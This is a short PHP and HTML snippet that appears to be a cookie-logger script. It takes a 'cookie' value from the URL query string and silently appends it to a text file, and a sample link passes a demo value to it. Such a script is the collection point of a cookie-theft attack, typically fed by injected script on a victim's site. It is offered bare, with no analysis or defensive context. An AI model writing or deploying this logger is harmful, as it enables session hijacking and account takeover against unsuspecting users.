<a href="cookie.php?cookie=Arif">Click Here</a>
<?php 

$cookie=$_GET['cookie'];

$info="$cookie\n";
$fh= @fopen("cookiess.txt","a");
@fwrite($fh,$info);
 ?>